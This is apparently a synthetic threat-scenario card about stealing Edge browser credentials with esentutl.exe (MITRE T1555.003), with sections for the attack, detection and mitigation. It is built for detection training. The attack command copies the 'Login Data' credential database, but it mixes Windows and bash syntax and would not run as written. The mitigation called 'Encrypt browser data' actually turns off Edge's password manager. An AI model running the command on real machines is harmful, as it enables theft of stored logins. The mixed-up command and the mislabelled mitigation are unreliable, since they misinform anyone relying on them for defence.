---
type: campaign
scenario_id: 61
tactic: Credential Access
technique: "T1555.003: Credentials from Web Browsers"
technique_id: T1555.003
tags: [campaign, lotl, credential_access]
---

# Extracting browser credentials using esentutl.exe on Edge database.

## Threat Description
Extracting browser credentials using esentutl.exe on Edge database.

## Attack Command
```
esentutl /y %localappdata%\Microsoft\Edge\User Data\Default\Login Data /d $(echo creds$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).db)
```

## Detection Logic
Monitor esentutl: `wmic process where name='esentutl.exe' get commandline`; Event ID 4688.

## Mitigation
Restrict esentutl: `icacls %windir%\System32\esentutl.exe /deny Everyone:RX`; Encrypt browser data: `reg add HKLM\Software\Policies\Microsoft\Edge /v PasswordManagerEnabled /t REG_DWORD /d 0`.

## AI Training Prompt
Train AI to detect esentutl credential extraction and suggest browser protections.

## References
- MITRE ATT&CK T1555.003: https://attack.mitre.org/techniques/T1555/003/
- CWE-522: https://cwe.mitre.org/data/definitions/522.html
